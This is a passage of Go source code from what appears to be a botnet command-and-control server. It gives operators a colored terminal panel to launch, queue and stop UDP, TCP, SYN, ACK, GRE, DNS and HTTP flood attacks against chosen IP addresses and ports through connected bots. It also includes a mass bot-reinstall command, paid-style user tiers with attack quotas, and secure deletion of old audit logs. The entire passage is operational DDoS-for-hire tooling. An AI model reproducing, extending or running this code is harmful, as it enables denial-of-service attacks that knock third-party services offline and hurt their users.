		case "bots", "bot":
			displayBotCount(conn)
		case "cls", "clear":
			conn.Write([]byte("\033[2J\033[H"))
		case "logout", "exit":
			animateText(conn, "Logging out... Goodbye!", 15*time.Millisecond, ColorAccent1)
			return
		case "!reinstall":
			if c.user.GetLevel() <= 1 {
				sendToBots("!reinstall", c.user.Username)
				animateText(conn, "Reinstall command sent to all bots.", 15*time.Millisecond, ColorSuccess)
			} else {
				logAuditEvent(c.user.Username, "PERMISSION", "Attempted to use !reinstall without sufficient privileges")
				animateText(conn, "Permission denied: Admin level required", 15*time.Millisecond, ColorError)
			}
		case "help":
			displayHelp(conn, c.user.GetLevel())
		case "db":
			if c.user.GetLevel() <= 1 {
				displayUserDatabase(conn)
			} else {
				logAuditEvent(c.user.Username, "PERMISSION", "Attempted to access user database without sufficient privileges")
				animateText(conn, "Permission denied: Admin level required", 15*time.Millisecond, ColorError)
			}
		case "logs":
			if c.user.GetLevel() <= 1 {
				displayAuditLogs(conn)
			} else {
				logAuditEvent(c.user.Username, "PERMISSION", "Attempted to access audit logs without sufficient privileges")
				animateText(conn, "Permission denied: Admin level required", 15*time.Millisecond, ColorError)
			}
		case "adduser":
			if c.user.GetLevel() <= 1 {
				handleAddUser(conn, parts)
			} else {
				logAuditEvent(c.user.Username, "PERMISSION", "Attempted to add user without sufficient privileges")
				animateText(conn, "Permission denied: Admin level required", 15*time.Millisecond, ColorError)
			}
		case "deluser":
			if c.user.GetLevel() <= 1 {
				handleDeleteUser(conn, parts)
			} else {
				logAuditEvent(c.user.Username, "PERMISSION", "Attempted to delete user without sufficient privileges")
				animateText(conn, "Permission denied: Admin level required", 15*time.Millisecond, ColorError)
			}
		case "resetpw":
			handleResetPassword(conn, c, parts)
		case "?":
			displayQuickHelp(conn)
		case "status":
			displayServerStatus(conn)
		case "stop":
			attackManagerInstance.removeAttack(conn)
			animateText(conn, "Stopped current attack", 15*time.Millisecond, ColorSuccess)
		case "stats":
			displayBotStats(conn)
		default:
			logAuditEvent(c.user.Username, "COMMAND", fmt.Sprintf("Invalid command: %s", command))
			animateText(conn, "Invalid command. Type 'help' for assistance.\r", 15*time.Millisecond, ColorError)
		}
	}
}

func getPrompt(userLevel int) string {
	var levelName string
	var levelColor string
	switch userLevel {
	case 0:
		levelName = "OWNER"
		levelColor = ColorSystem
	case 1:
		levelName = "ADMIN"
		levelColor = ColorAccent1
	case 2:
		levelName = "PRO"
		levelColor = ColorMid2
	default:
		levelName = "BASIC"
		levelColor = ColorMid1
	}
	return fmt.Sprintf("\n\r\033[38;5;%sm[\033[38;5;%smPr\033[38;5;%smo\033[38;5;%smmpt\033[38;5;%sm]@[%s]\033[38;5;%sm► \033[0m",
		ColorMid1, ColorStart, ColorMid2, ColorMid3, ColorMid1,
		colorizeText(levelName, levelColor), ColorSuccess)
}

func handleAttackCommand(conn net.Conn, parts []string, c *client) {
	if c.user.GetLevel() > 2 {
		allowed := map[string]bool{"!udpflood": true, "!tcpflood": true}
		if !allowed[parts[0]] {
			animateText(conn, "Permission denied: Method not allowed for your level", 15*time.Millisecond, ColorError)
			return
		}
	}
	if len(parts) < 4 {
		animateText(conn, "Error: Usage: method ip port duration", 15*time.Millisecond, ColorError)
		return
	}
	method := parts[0]
	ip := parts[1]
	port := parts[2]
	duration := parts[3]
	if !allowedMethods[method] {
		animateText(conn, "Error: Invalid attack method", 10*time.Millisecond, ColorError)
		return
	}
	if !validateIP(ip) {
		animateText(conn, "Error: Invalid IP address", 10*time.Millisecond, ColorError)
		return
	}
	if !validatePort(port) {
		animateText(conn, "Error: Invalid port number (1-65535)", 15*time.Millisecond, ColorError)
		return
	}
	if !validateDuration(duration) {
		animateText(conn, "Error: Invalid duration format. Use seconds (e.g., 60)", 15*time.Millisecond, ColorError)
		return
	}
	dur, _ := time.ParseDuration(duration + "s")
	userLimiter := getUserLimiter(c.user.Username)
	if !userLimiter.canAttack() {
		animateText(conn, "Daily attack quota exceeded", 15*time.Millisecond, ColorError)
		return
	}
	userLimiter.attacksToday++
	logAuditEvent(c.user.Username, "ATTACK", fmt.Sprintf("Launched %s attack on %s:%s for %s seconds", method, ip, port, duration))
	displayAttackLaunch(conn, method, ip, port, duration)
	priority := 0
	switch c.user.GetLevel() {
	case 0:
		priority = 3
	case 1:
		priority = 2
	case 2:
		priority = 1
	}
	attack := Attack{
		Method:    method,
		IP:        ip,
		Port:      port,
		Duration:  dur,
		Start:     time.Now(),
		User:      c.user.Username,
		Conn:      conn,
		QueueTime: time.Now(),
		Priority:  priority,
		Signature: signCommand(fmt.Sprintf("%s %s %s %d", method, ip, port, int(dur.Seconds()))),
	}
	attackManagerInstance.mutex.Lock()
	defer attackManagerInstance.mutex.Unlock()
	if len(attackManagerInstance.attacks) >= attackManagerInstance.getMaxAttacks() {
		if len(attackManagerInstance.attackQueue) >= cfg.MaxQueuedAttacks {
			animateText(conn, "Error: Attack queue is full", 15*time.Millisecond, ColorError)
			return
		}
		attackManagerInstance.attackQueue = append(attackManagerInstance.attackQueue, attack)
		animateText(conn, fmt.Sprintf("Attack queued (position %d)", len(attackManagerInstance.attackQueue)),
			15*time.Millisecond, ColorWarning)
		return
	}
	launchAttack(conn, attack)
}

func displayQueuedAttacks(conn net.Conn, c *client) {
	attacks := attackManagerInstance.getUserQueuedAttacks(c.user.Username)
	if len(attacks) == 0 {
		animateText(conn, "No queued attacks found.\n\r", 15*time.Millisecond, ColorInfo)
		return
	}
	conn.Write([]byte("\033[2J\033[3J\033[2J\033[H"))
	border := fmt.Sprintf("\033[38;5;%sm+\033[38;5;%sm-\033[38;5;%sm-\033[38;5;%sm-\033[38;5;%sm-\033[0m\n\r",
		ColorStart, ColorMid1, ColorMid2, ColorMid3, ColorEnd)
	conn.Write([]byte(border))
	title := fmt.Sprintf("\033[38;5;%sm|\033[38;5;%sm    QUEUED ATTACKS    \033[0m\n\r",
		ColorMid1, ColorAccent1)
	conn.Write([]byte(title))
	conn.Write([]byte(border))
	headers := fmt.Sprintf("\033[38;5;%sm| %-3s | %-9s | %-15s | %-5s | %-8s | %-10s |\033[0m\n\r",
		ColorMid1, "ID", "Method", "Target", "Port", "Duration", "Queued For")
	conn.Write([]byte(headers))
	conn.Write([]byte(border))
	for idx, attack := range attacks {
		row := fmt.Sprintf("\033[38;5;%sm| %-3d | %-9s | %-15s | %-5s | %-8ds | %-10s |\033[0m\n\r",
			ColorMid2,
			idx+1,
			attack.Method,
			attack.IP,
			attack.Port,
			int(attack.Duration.Seconds()),
			time.Since(attack.QueueTime).Round(time.Second))
		conn.Write([]byte(row))
	}
	conn.Write([]byte(border))
	animateText(conn, "Use 'cancel <ID>' to remove a queued attack", 15*time.Millisecond, ColorInfo)
}

func handleCancelAttack(conn net.Conn, parts []string, c *client) {
	if len(parts) < 2 {
		animateText(conn, "Usage: cancel <queue ID>", 15*time.Millisecond, ColorError)
		return
	}
	index, _ := strconv.Atoi(parts[1])
	if index < 1 {
		animateText(conn, "Invalid queue ID", 15*time.Millisecond, ColorError)
		return
	}
	if attackManagerInstance.cancelQueuedAttack(c.user.Username, index-1) {
		animateText(conn, fmt.Sprintf("Cancelled queued attack #%d", index), 15*time.Millisecond, ColorSuccess)
	} else {
		animateText(conn, fmt.Sprintf("No queued attack found with ID %d", index), 15*time.Millisecond, ColorError)
	}
}

func displayAttackLaunch(conn net.Conn, method, ip, port, duration string) {
	conn.Write([]byte("\033[2J\033[3J\033[2J\033[H"))
	border := fmt.Sprintf("\033[38;5;%sm+\033[38;5;%sm-\033[38;5;%sm-\033[38;5;%sm-\033[38;5;%sm-\033[0m\n\r",
		ColorStart, ColorMid1, ColorMid2, ColorMid3, ColorEnd)
	conn.Write([]byte(border))
	title := fmt.Sprintf("\033[38;5;%sm|\033[38;5;%sm    ATTACK LAUNCHED    \033[0m\n",
		ColorMid1, ColorAccent1)
	conn.Write([]byte(title))
	conn.Write([]byte(border))
	conn.Write([]byte(fmt.Sprintf("\033[38;5;%sm| Method: \033[38;5;%sm%s\033[0m\n\r",
		ColorMid1, ColorAccent2, method)))
	conn.Write([]byte(fmt.Sprintf("\033[38;5;%sm| Target: \033[38;5;%sm%s:%s\033[0m\n\r",
		ColorMid1, ColorAccent2, ip, port)))
	conn.Write([]byte(fmt.Sprintf("\033[38;5;%sm| Duration: \033[38;5;%sm%s seconds\033[0m\n\r",
		ColorMid1, ColorAccent2, duration)))
	conn.Write([]byte(fmt.Sprintf("\033[38;5;%sm| Bots: \033[38;5;%sm%d\033[0m\n\r",
		ColorMid1, ColorAccent2, getBotCount())))
	conn.Write([]byte(border))
}

func displayOngoingAttacks(conn net.Conn) {
	attacks := attackManagerInstance.getAttacks()
	if len(attacks) == 0 {
		animateText(conn, "No ongoing attacks found.\n\r", 15*time.Millisecond, ColorInfo)
		return
	}
	conn.Write([]byte("\033[2J\033[3J\033[2J\033[H"))
	border := fmt.Sprintf("\033[38;5;%sm+\033[38;5;%sm-\033[38;5;%sm-\033[38;5;%sm-\033[38;5;%sm-\033[0m\n\r",
		ColorStart, ColorMid1, ColorMid2, ColorMid3, ColorEnd)
	conn.Write([]byte(border))
	title := fmt.Sprintf("\033[38;5;%sm|\033[38;5;%sm    ONGOING ATTACKS    \033[0m\n\r",
		ColorMid1, ColorAccent1)
	conn.Write([]byte(title))
	conn.Write([]byte(border))
	headers := fmt.Sprintf("\033[38;5;%sm| %-9s | %-10s | %-5s | %-8s | %-15s | %-15s |\033[0m\n\r",
		ColorMid1, "Method", "Target", "Port", "Duration", "Time Remaining", "User")
	conn.Write([]byte(headers))
	conn.Write([]byte(border))
	for _, attack := range attacks {
		remaining := time.Until(attack.Start.Add(attack.Duration))
		if remaining > 0 {
			row := fmt.Sprintf("\033[38;5;%sm| %-9s | %-10s | %-5s | %-8ds | %-15s | %-15s |\033[0m\n\r",
				ColorMid2,
				attack.Method,
				attack.IP,
				attack.Port,
				int(attack.Duration.Seconds()),
				remaining.Round(time.Second),
				attack.User)
			conn.Write([]byte(row))
		}
	}
	conn.Write([]byte(border))
}

func displayBotCount(conn net.Conn) {
	count := getBotCount()
	conn.Write([]byte("\033[2J\033[3J\033[2J\033[H"))
	border := fmt.Sprintf("\033[38;5;%sm+\033[38;5;%sm-\033[38;5;%sm-\033[38;5;%sm-\033[38;5;%sm-\033[0m\n\r",
		ColorStart, ColorMid1, ColorMid2, ColorMid3, ColorEnd)
	conn.Write([]byte(border))
	title := fmt.Sprintf("\033[38;5;%sm|\033[38;5;%sm    CONNECTED BOTS    \033[0m\n\r",
		ColorMid1, ColorAccent1)
	conn.Write([]byte(title))
	conn.Write([]byte(border))
	content := fmt.Sprintf("\033[38;5;%sm| Total bots online: \033[38;5;%sm%d\033[0m\n\r",
		ColorMid1, ColorAccent2, count)
	conn.Write([]byte(content))
	conn.Write([]byte(border))
}

func displayHelp(conn net.Conn, userLevel int) {
	conn.Write([]byte("\033[2J\033[3J\033[2J\033[H"))
	border := fmt.Sprintf("\033[38;5;%sm+\033[38;5;%sm-\033[38;5;%sm-\033[38;5;%sm-\033[38;5;%sm-\033[0m\n\r",
		ColorStart, ColorMid1, ColorMid2, ColorMid3, ColorEnd)
	conn.Write([]byte(border))
	title := fmt.Sprintf("\033[38;5;%sm|\033[38;5;%sm    HELP    \033[0m\n\r",
		ColorMid1, ColorAccent1)
	conn.Write([]byte(title))
	conn.Write([]byte(border))
	commands := []struct {
		cmd  string
		desc string
	}{
		{"?", "See all the different attack methods"},
		{"![method]", "Start an attack (method ip port duration)"},
		{"queue", "View your queued attacks"},
		{"cancel", "Cancel a queued attack (cancel <ID>)"},
		{"stop", "Stop an ongoing attack"},
		{"bots/bot", "Display connected bots count"},
		{"help", "Display this help message"},
		{"!reinstall", "Send reinstall command to all bots"},
		{"ongoing", "See all Current running attacks"},
		{"status", "Show server status information"},
		{"stats", "View bot performance stats"},
	}
	for _, cmd := range commands {
		line := fmt.Sprintf("\033[38;5;%sm| \033[38;5;%sm%-15s \033[38;5;%sm- %s\033[0m\n\r",
			ColorMid1, ColorAccent2, cmd.cmd, ColorAccent1, cmd.desc)
		conn.Write([]byte(line))
	}
	if userLevel <= 1 {
		conn.Write([]byte(border))
		adminTitle := fmt.Sprintf("\033[38;5;%sm|\033[38;5;%sm    ADMIN COMMANDS    \033[0m\n\r",
			ColorMid1, ColorSystem)
		conn.Write([]byte(adminTitle))
		conn.Write([]byte(border))
		adminCmds := []struct {
			cmd  string
			desc string
		}{
			{"db", "Fetch all user login info"},
			{"logs", "View system audit logs"},
			{"adduser", "Create a new user (adduser <username> <level>)"},
			{"deluser", "Delete a user (deluser <username>)"},
			{"resetpw", "Reset a user's password (resetpw <username>)"},
		}
		for _, cmd := range adminCmds {
			line := fmt.Sprintf("\033[38;5;%sm| \033[38;5;%sm%-15s \033[38;5;%sm- %s\033[0m\n\r",
				ColorMid1, ColorSystem, cmd.cmd, ColorSystem, cmd.desc)
			conn.Write([]byte(line))
		}
	}
	conn.Write([]byte(border))
}

func displayUserDatabase(conn net.Conn) {
	file, _ := os.Open(cfg.UsersFile)
	defer file.Close()
	data, _ := io.ReadAll(file)
	var users []User
	json.Unmarshal(data, &users)
	conn.Write([]byte("\033[2J\033[3J\033[2J\033[H"))
	border := fmt.Sprintf("\033[38;5;%sm+\033[38;5;%sm-\033[38;5;%sm-\033[38;5;%sm-\033[38;5;%sm-\033[0m\n\r",
		ColorStart, ColorMid1, ColorMid2, ColorMid3, ColorEnd)
	conn.Write([]byte(border))
	title := fmt.Sprintf("\033[38;5;%sm|\033[38;5;%sm    USER DATABASE    \033[0m\n\r",
		ColorMid1, ColorSystem)
	conn.Write([]byte(title))
	conn.Write([]byte(border))
	headers := fmt.Sprintf("\033[38;5;%sm| %-14s | %-14s | %-19s | %-10s | %-19s |\033[0m\n\r",
		ColorMid1, "Username", "Password", "Expiration", "Level", "Last Activity")
	conn.Write([]byte(headers))
	conn.Write([]byte(border))
	for _, user := range users {
		row := fmt.Sprintf("\033[38;5;%sm| %-14s | %-14s | %-19s | %-10s | %-19s |\033[0m\n\r",
			ColorMid2,
			user.Username,
			"********",
			user.Expire.Format("2006-01-02"),
			user.Level,
			user.LastActivity.Format("2006-01-02 15:04"))
		conn.Write([]byte(row))
	}
	conn.Write([]byte(border))
}

func handleAddUser(conn net.Conn, parts []string) {
	if len(parts) < 3 {
		animateText(conn, "Usage: adduser <username> <level>", 15*time.Millisecond, ColorError)
		return
	}
	username := sanitizeInput(parts[1])
	level := strings.ToLower(parts[2])
	var validLevel string
	switch level {
	case "owner":
		validLevel = "Owner"
	case "admin":
		validLevel = "Admin"
	case "pro":
		validLevel = "Pro"
	case "basic":
		validLevel = "Basic"
	default:
		animateText(conn, "Invalid level. Must be owner, admin, pro, or basic", 15*time.Millisecond, ColorError)
		return
	}
	users := []User{}
	if data, err := os.ReadFile(cfg.UsersFile); err == nil {
		json.Unmarshal(data, &users)
	}
	for _, user := range users {
		if user.Username == username {
			animateText(conn, "Error: User already exists", 15*time.Millisecond, ColorError)
			return
		}
	}
	password, _ := generateSecureString(12)
	hashedPassword, _ := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)
	newUser := User{
		Username:     username,
		PasswordHash: string(hashedPassword),
		Expire:       time.Now().AddDate(1, 0, 0),
		Level:        validLevel,
		CreatedAt:    time.Now(),
		LastActivity: time.Now(),
	}
	users = append(users, newUser)
	saveUsers(users)
	logAuditEvent("SYSTEM", "USER", fmt.Sprintf("User %s created with level %s", username, validLevel))
	animateText(conn, fmt.Sprintf("User %s created successfully with password: %s", username, password), 15*time.Millisecond, ColorSuccess)
}

func handleDeleteUser(conn net.Conn, parts []string) {
	if len(parts) < 2 {
		animateText(conn, "Usage: deluser <username>", 15*time.Millisecond, ColorError)
		return
	}
	username := sanitizeInput(parts[1])
	if username == "root" {
		animateText(conn, "Cannot delete root user", 15*time.Millisecond, ColorError)
		return
	}
	users := []User{}
	if data, err := os.ReadFile(cfg.UsersFile); err == nil {
		json.Unmarshal(data, &users)
	}
	found := false
	for idx, user := range users {
		if user.Username == username {
			users = append(users[:idx], users[idx+1:]...)
			found = true
			break
		}
	}
	if !found {
		animateText(conn, "Error: User not found", 15*time.Millisecond, ColorError)
		return
	}
	saveUsers(users)
	logAuditEvent("SYSTEM", "USER", fmt.Sprintf("User %s deleted", username))
	animateText(conn, fmt.Sprintf("User %s deleted successfully", username), 15*time.Millisecond, ColorSuccess)
}

func handleResetPassword(conn net.Conn, c *client, parts []string) {
	if len(parts) < 2 && c.user.GetLevel() > 1 {
		animateText(conn, "Usage: resetpw <username>", 15*time.Millisecond, ColorError)
		return
	}
	var username string
	if len(parts) >= 2 {
		if c.user.GetLevel() > 1 {
			animateText(conn, "Permission denied: Admin level required", 15*time.Millisecond, ColorError)
			return
		}
		username = sanitizeInput(parts[1])
	} else {
		username = c.user.Username
	}
	users := []User{}
	if data, err := os.ReadFile(cfg.UsersFile); err == nil {
		json.Unmarshal(data, &users)
	}
	var found bool
	for _, user := range users {
		if user.Username == username {
			found = true
			break
		}
	}
	if !found {
		animateText(conn, "Error: User not found", 15*time.Millisecond, ColorError)
		return
	}
	token, _ := generateSecureString(32)
	expires := time.Now().Add(cfg.ResetTokenValidity)
	resetTokens.Lock()
	resetTokens.m[username] = resetToken{
		username: username,
		token:    token,
		expires:  expires,
		used:     false,
	}
	resetTokens.Unlock()
	animateText(conn, fmt.Sprintf("Password reset token for %s: %s", username, token), 15*time.Millisecond, ColorSuccess)
	animateText(conn, fmt.Sprintf("Token expires at: %s", expires.Format(time.RFC1123)), 15*time.Millisecond, ColorWarning)
	logAuditEvent(c.user.Username, "PASSWORD", fmt.Sprintf("Generated reset token for %s", username))
}

func displayAuditLogs(conn net.Conn) {
	file, _ := os.Open(cfg.AuditLogFile)
	defer file.Close()
	conn.Write([]byte("\033[2J\033[H"))
	fmt.Fprintf(conn, "%-25s %-15s %-20s %-30s\n", "Timestamp", "User", "Event", "Details")
	fmt.Fprintf(conn, "%-25s %-15s %-20s %-30s\n", strings.Repeat("-", 25), strings.Repeat("-", 15), strings.Repeat("-", 20), strings.Repeat("-", 30))
	scanner := bufio.NewScanner(file)
	lines := 0
	for scanner.Scan() && lines < 100 {
		var logEntry AuditLog
		json.Unmarshal([]byte(scanner.Text()), &logEntry)
		fmt.Fprintf(conn, "%-25s %-15s %-20s %-30s\n",
			logEntry.Timestamp.Format("2006-01-02 15:04:05"),
			truncateString(logEntry.User, 15),
			truncateString(logEntry.Event, 20),
			truncateString(logEntry.Details, 30))
		lines++
	}
}

func displayServerStatus(conn net.Conn) {
	conn.Write([]byte("\033[2J\033[H"))
	stats := getAggregatedStats()
	fmt.Fprintf(conn, "Server Status:\n")
	fmt.Fprintf(conn, "Uptime: %s (System: %.2f hours)\n",
		time.Since(serverStartTime).Round(time.Second),
		getUptime()/3600)
	fmt.Fprintf(conn, "System Load: %.2f\n", getSystemLoad())
	fmt.Fprintf(conn, "System RAM: %.2fGB\n", getSystemRAM())
	fmt.Fprintf(conn, "CPU Cores: %d\n", getCPUCount())
	fmt.Fprintf(conn, "Bots: %d (Healthy: %d, Unhealthy: %d)\n", getBotCount(), stats.HealthyBots, stats.UnhealthyBots)
	fmt.Fprintf(conn, "Active Attacks: %d/%d\n", attackManagerInstance.countAttacks(), attackManagerInstance.getMaxAttacks())
	fmt.Fprintf(conn, "Active Sessions: %d\n", len(clients))
	fmt.Fprintf(conn, "Avg Latency: %v\n", stats.AvgLatency.Round(time.Millisecond))
	fmt.Fprintf(conn, "Avg Throughput: %.2f/s\n", stats.AvgThroughput)
	fmt.Fprintf(conn, "Total RAM: %.1fGB\n", stats.TotalRAM)
	fmt.Fprintf(conn, "Total Cores: %d\n", stats.TotalCores)
}

func displayQuickHelp(conn net.Conn) {
	conn.Write([]byte("\033[2J\033[H"))
	fmt.Fprintf(conn, "Available Attack Methods:\n")
	fmt.Fprintf(conn, "!udpflood - Standard UDP flood attack\n")
	fmt.Fprintf(conn, "!udpsmart - UDP flood with smart payload\n")
	fmt.Fprintf(conn, "!tcpflood - TCP flood attack\n")
	fmt.Fprintf(conn, "!synflood - SYN flood attack\n")
	fmt.Fprintf(conn, "!ackflood - ACK flood attack\n")
	fmt.Fprintf(conn, "!greflood - GRE flood attack\n")
	fmt.Fprintf(conn, "!dns - DNS flood attack\n")
	fmt.Fprintf(conn, "!http - HTTP flood attack\n")
	fmt.Fprintf(conn, "\nType 'help' for more commands\n")
}

func displayBotStats(conn net.Conn) {
	botStatsLock.Lock()
	defer botStatsLock.Unlock()
	if len(botPerformance) == 0 {
		animateText(conn, "No bot performance data available", 15*time.Millisecond, ColorWarning)
		return
	}
	stats := make([]struct {
		ip    string
		stats BotStats
	}, 0, len(botPerformance))
	for ip, stat := range botPerformance {
		stats = append(stats, struct {
			ip    string
			stats BotStats
		}{ip, stat})
	}
	sort.Slice(stats, func(i, j int) bool {
		return stats[i].ip < stats[j].ip
	})
	pageSize := 10
	currentPage := 0
	totalPages := (len(stats) + pageSize - 1) / pageSize
	for {
		conn.Write([]byte("\033[2J\033[H"))
		fmt.Fprintf(conn, "Bot Performance Stats (Page %d/%d) - Total Bots: %d\n\n",
			currentPage+1, totalPages, len(stats))
		fmt.Fprintf(conn, "%-20s %-10s %-10s %-6s %-15s %-10s\n",
			"IP", "Latency", "Throughput", "RAM", "Arch", "Last Seen")
		start := currentPage * pageSize
		end := start + pageSize
		if end > len(stats) {
			end = len(stats)
		}
		for _, stat := range stats[start:end] {
			fmt.Fprintf(conn, "%-20s %-10v %-10.2f %-6.1f %-15s %-10s\n",
				truncateString(stat.ip, 20),
				stat.stats.Latency.Round(time.Millisecond),
				stat.stats.Throughput,
				stat.stats.RAM,
				truncateString(stat.stats.Architecture, 15),
				stat.stats.LastSeen.Format("15:04:05"))
		}
		fmt.Fprintf(conn, "\nNavigation: n-next, p-previous, q-quit\n> ")
		reader := bufio.NewReader(conn)
		input, _ := reader.ReadString('\n')
		input = strings.TrimSpace(input)
		switch input {
		case "n":
			if currentPage < totalPages-1 {
				currentPage++
			}
		case "p":
			if currentPage > 0 {
				currentPage--
			}
		case "q":
			return
		}
	}
}

func checkCertificates() error {
	if _, err := os.Stat(cfg.CertFile); os.IsNotExist(err) {
		return fmt.Errorf("certificate file %s not found", cfg.CertFile)
	}
	if _, err := os.Stat(cfg.KeyFile); os.IsNotExist(err) {
		return fmt.Errorf("private key file %s not found", cfg.KeyFile)
	}
	return nil
}

func initializeAuditLog() {
	file, _ := os.OpenFile(cfg.AuditLogFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	file.Close()
}

func rotateLogs() {
	ticker := time.NewTicker(1 * time.Hour)
	defer ticker.Stop()
	for range ticker.C {
		if info, err := os.Stat(cfg.AuditLogFile); err == nil && info.Size() > cfg.MaxLogSize {
			if err := secureDelete(cfg.AuditLogFile + ".old"); err == nil || os.IsNotExist(err) {
				os.Rename(cfg.AuditLogFile, cfg.AuditLogFile+".old")
				initializeAuditLog()
			}
		}
	}
}

func initializeRootUser() {
	users := []User{}
	if data, err := os.ReadFile(cfg.UsersFile); err == nil {
		json.Unmarshal(data, &users)
	}

	rootExists := false
	for _, user := range users {
		if user.Username == "root" {
			rootExists = true
			break
		}
	}

	if !rootExists {
		password, _ := generateSecureString(16)
		hashedPassword, _ := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)
		rootUser := User{
			Username:     "root",
			PasswordHash: string(hashedPassword),
			Expire:       time.Now().AddDate(10, 0, 0),
			Level:        "Owner",
			CreatedAt:    time.Now(),
		}
		users = append(users, rootUser)
		saveUsers(users)

		// Print to terminal (stdout)
		fmt.Printf("\n[!] Root user created for the first time.\n")
		fmt.Printf("[!] Username: root\n")
		fmt.Printf("[!] Password: %s\n", password)
		fmt.Printf("[!] Store this password securely. It will not be shown again.\n\n")

		// Log to audit (as before)
		logAuditEvent("SYSTEM", "INIT", "Root user created")
	}
}

func validateIP(ip string) bool {
	parsed := net.ParseIP(ip)
	if parsed == nil {
		return false
	}
	for _, block := range reservedIPBlocks {
		_, network, _ := net.ParseCIDR(block)
		if network.Contains(parsed) {
			return false
		}
	}
	badIPs := []string{"127.0.0.1", "0.0.0.0", "255.255.255.255"}
	for _, bad := range badIPs {
		if ip == bad {
			return false
		}
	}
	return true
}

func validatePort(portStr string) bool {
	port, err := strconv.Atoi(portStr)
	if err != nil {
		return false
	}
	return port > 0 && port <= 65535
}

func validateDuration(duration string) bool {
	dur, _ := strconv.Atoi(duration)
	return dur > 0 && dur <= cfg.MaxAttackDuration
}

func getFromConn(conn net.Conn) (string, error) {
	reader := bufio.NewReader(io.LimitReader(conn, int64(cfg.MaxReadSize)))
	readString, _ := reader.ReadString('\n')
	readString = strings.TrimSuffix(readString, "\n")
	readString = strings.TrimSuffix(readString, "\r")
	return sanitizeInput(readString), nil
}

func authUser(conn net.Conn) (bool, *client) {
	conn.Write([]byte("\033[2J\033[H\033[2J\033[3J"))
	remoteAddr := conn.RemoteAddr().String()
	if !loginRateLimiter.Allow() {
		logAuditEvent("SYSTEM", "AUTH", fmt.Sprintf("Rate limit exceeded from %s", remoteAddr))
		conn.Write([]byte("Too many login attempts. Please try again later.\n"))
		conn.Close()
		return false, nil
	}
	for attempt := 0; attempt < 3; attempt++ {
		conn.Write([]byte(fmt.Sprintf("\033[38;5;%smAttempt %d/3\033\r\n[0m ", ColorAccent2, attempt+1)))
		conn.Write([]byte(fmt.Sprintf("\033\r\n[38;5;%sm• Username\033[38;5;62m:  \033[0m", ColorAccent1)))
		username, _ := getFromConn(conn)
		username = sanitizeInput(username)
		conn.Write([]byte(fmt.Sprintf("\033[38;5;%sm• Password\033[38;5;62m: \033[0m", ColorAccent1)))
		conn.Write([]byte("\033[8m"))
		password, _ := getFromConn(conn)
		conn.Write([]byte("\033[0m\033[?25h"))
		if exists, user := AuthUser(username, password); exists {
			resetTokens.RLock()
			if t, ok := resetTokens.m[username]; ok {
				if time.Now().Before(t.expires) && !t.used {
					conn.Write([]byte("\nYou have a pending password reset. Enter your reset token or press enter to continue:\n"))
					conn.Write([]byte(fmt.Sprintf("\033[38;5;%sm• Reset Token\033[38;5;62m: \033[0m", ColorAccent1)))
					token, _ := getFromConn(conn)
					if checkResetToken(username, token) {
						conn.Write([]byte("\nPlease enter your new password:\n"))
						conn.Write([]byte(fmt.Sprintf("\033[38;5;%sm• New Password\033[38;5;62m: \033[0m", ColorAccent1)))
						conn.Write([]byte("\033[8m"))
						newPassword, _ := getFromConn(conn)
						conn.Write([]byte("\033[0m"))
						hashedPassword, _ := bcrypt.GenerateFromPassword([]byte(newPassword), bcrypt.DefaultCost)
						users := []User{}
						if data, err := os.ReadFile(cfg.UsersFile); err == nil {
							json.Unmarshal(data, &users)
							for i := range users {
								if users[i].Username == username {
									users[i].PasswordHash = string(hashedPassword)
									break
								}
							}
							saveUsers(users)
						}
						resetTokens.Lock()
						tokenEntry := resetTokens.m[username]
						tokenEntry.used = true
						resetTokens.m[username] = tokenEntry
						resetTokens.Unlock()
						animateText(conn, "Password changed successfully!", 15*time.Millisecond, ColorSuccess)
						logAuditEvent(username, "PASSWORD", "Password changed via reset token")
					}
				}
			}
			resetTokens.RUnlock()
			userSessionLock.Lock()
			if userSessions[username] >= cfg.MaxSessionsPerUser {
				userSessionLock.Unlock()
				conn.Write([]byte("Maximum concurrent sessions reached.\n"))
				conn.Close()
				return false, nil
			}
			userSessions[username]++
			userSessionLock.Unlock()
			sessionID, _ := generateSessionID()
			ctx, cancel := context.WithCancel(context.Background())
			loggedClient := &client{
				conn:       conn,
				user:       *user,
				sessionID:  sessionID,
				remoteAddr: remoteAddr,
				ctx:        ctx,
				cancel:     cancel,
			}
			sessionStore.Set(sessionID, &session{
				client:     loggedClient,
				lastActive: time.Now(),
				loginIP:    remoteAddr,
			})
			conn.Write([]byte("\033[2J\033[H\033[2J\033[3J"))
			clients = append(clients, loggedClient)
			logAuditEvent(username, "SESSION", fmt.Sprintf("New session started from %s", remoteAddr))
			return true, loggedClient
		}
		conn.Write([]byte("\033[2J\033[H\033[2J\033[3J"))
		if attempt < 2 {
			conn.Write([]byte("Invalid credentials. Please try again.\n"))
		}
	}
	conn.Write([]byte("\033[2J\033[H\033[2J\033[3J"))
	conn.Write([]byte("Maximum login attempts reached. Connection closed.\n"))
	conn.Close()
	return false, nil
}

func checkResetToken(username, token string) bool {
	resetTokens.RLock()
	defer resetTokens.RUnlock()
	if t, ok := resetTokens.m[username]; ok {
		if t.token == token && time.Now().Before(t.expires) && !t.used {
			return true
		}
	}
	return false
}

func sanitizeInput(input string) string {
	var result strings.Builder
	for _, r := range input {
		switch {
		case r == '\n', r == '\r', r == '\t':
			continue
		case unicode.IsGraphic(r) && !unicode.IsControl(r):
			result.WriteRune(r)
		}
	}
	return strings.TrimSpace(result.String())
}

func truncateString(str string, length int) string {
	if len(str) > length {
		return str[:length-3] + "..."
	}
	return str
}
